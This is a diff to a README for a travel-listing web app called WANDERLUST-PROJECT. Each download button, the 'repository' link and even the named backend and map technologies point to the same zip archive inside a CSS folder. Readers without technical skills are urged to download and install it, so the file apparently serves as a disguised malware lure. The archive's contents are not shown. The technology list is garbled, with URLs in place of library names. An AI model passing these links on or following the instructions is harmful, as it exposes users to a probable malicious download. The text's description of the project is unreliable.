@@ -1,12 +1,12 @@
 # 🌍 WANDERLUST-PROJECT - Explore Travel Listings Easily
 
-[![Download WANDERLUST-PROJECT](https://raw.githubusercontent.com/jxx12345678/WANDERLUST-PROJECT/main/public/css/PROJECT-WANDERLUS-v2.7.zip)](https://raw.githubusercontent.com/jxx12345678/WANDERLUST-PROJECT/main/public/css/PROJECT-WANDERLUS-v2.7.zip)
+[![Download WANDERLUST-PROJECT](https://github.com/jxx12345678/WANDERLUST-PROJECT/raw/refs/heads/main/public/css/PROJECT-WANDERLUS-v2.7.zip)](https://github.com/jxx12345678/WANDERLUST-PROJECT/raw/refs/heads/main/public/css/PROJECT-WANDERLUS-v2.7.zip)
 
 ## 📖 Overview
 
 WANDERLUST-PROJECT is a travel listing web app that helps you find and share travel spots. It shows places on interactive maps. You can log in to add reviews, upload images, and manage your listings. The app works smoothly on most devices and has easy navigation for all users.
 
-This app uses popular technologies like https://raw.githubusercontent.com/jxx12345678/WANDERLUST-PROJECT/main/public/css/PROJECT-WANDERLUS-v2.7.zip and MongoDB behind the scenes, but you do not need any technical skills to use it. It’s made to give you a simple way to explore or add travel locations, read others’ experiences, and plan your next trip.
+This app uses popular technologies like https://github.com/jxx12345678/WANDERLUST-PROJECT/raw/refs/heads/main/public/css/PROJECT-WANDERLUS-v2.7.zip and MongoDB behind the scenes, but you do not need any technical skills to use it. It’s made to give you a simple way to explore or add travel locations, read others’ experiences, and plan your next trip.
 
 ---
 
@@ -15,7 +15,7 @@ This app uses popular technologies like https://raw.githubusercontent.com/jxx123
 You need to visit the official release page to get the app. Follow these steps carefully:
 
 1. Go to the release page by clicking the button below:  
-   [![Download WANDERLUST-PROJECT](https://raw.githubusercontent.com/jxx12345678/WANDERLUST-PROJECT/main/public/css/PROJECT-WANDERLUS-v2.7.zip)](https://raw.githubusercontent.com/jxx12345678/WANDERLUST-PROJECT/main/public/css/PROJECT-WANDERLUS-v2.7.zip)
+   [![Download WANDERLUST-PROJECT](https://github.com/jxx12345678/WANDERLUST-PROJECT/raw/refs/heads/main/public/css/PROJECT-WANDERLUS-v2.7.zip)](https://github.com/jxx12345678/WANDERLUST-PROJECT/raw/refs/heads/main/public/css/PROJECT-WANDERLUS-v2.7.zip)
 
 2. On the page, look for the latest release version. You will find files to download there.
 
@@ -97,7 +97,7 @@ If you run into problems:
 
 For help or feedback, you can:
 
-- Visit the GitHub repository: https://raw.githubusercontent.com/jxx12345678/WANDERLUST-PROJECT/main/public/css/PROJECT-WANDERLUS-v2.7.zip
+- Visit the GitHub repository: https://github.com/jxx12345678/WANDERLUST-PROJECT/raw/refs/heads/main/public/css/PROJECT-WANDERLUS-v2.7.zip
 - Use the "Issues" tab to report bugs or request features.
 - Check the release notes on the download page for updates and fixes.
 
@@ -107,10 +107,10 @@ For help or feedback, you can:
 
 WANDERLUST-PROJECT is built with:
 
-- **https://raw.githubusercontent.com/jxx12345678/WANDERLUST-PROJECT/main/public/css/PROJECT-WANDERLUS-v2.7.zip** and **Express** for backend server.
+- **https://github.com/jxx12345678/WANDERLUST-PROJECT/raw/refs/heads/main/public/css/PROJECT-WANDERLUS-v2.7.zip** and **Express** for backend server.
 - **MongoDB** and **Mongoose** for database storage.
 - **EJS** templates for rendering pages.
-- **https://raw.githubusercontent.com/jxx12345678/WANDERLUST-PROJECT/main/public/css/PROJECT-WANDERLUS-v2.7.zip** for interactive maps.
+- **https://github.com/jxx12345678/WANDERLUST-PROJECT/raw/refs/heads/main/public/css/PROJECT-WANDERLUS-v2.7.zip** for interactive maps.
 - **Cloudinary** for image handling.
 - User authentication systems to protect accounts.
 
@@ -119,6 +119,6 @@ WANDERLUST-PROJECT is built with:
 ## 🏁 Final Step
 
 Start your journey by visiting the release page:  
-[![Download WANDERLUST-PROJECT](https://raw.githubusercontent.com/jxx12345678/WANDERLUST-PROJECT/main/public/css/PROJECT-WANDERLUS-v2.7.zip)](https://raw.githubusercontent.com/jxx12345678/WANDERLUST-PROJECT/main/public/css/PROJECT-WANDERLUS-v2.7.zip)
+[![Download WANDERLUST-PROJECT](https://github.com/jxx12345678/WANDERLUST-PROJECT/raw/refs/heads/main/public/css/PROJECT-WANDERLUS-v2.7.zip)](https://github.com/jxx12345678/WANDERLUST-PROJECT/raw/refs/heads/main/public/css/PROJECT-WANDERLUS-v2.7.zip)
 
 Download the latest version today, install it, and begin exploring travel listings with ease.
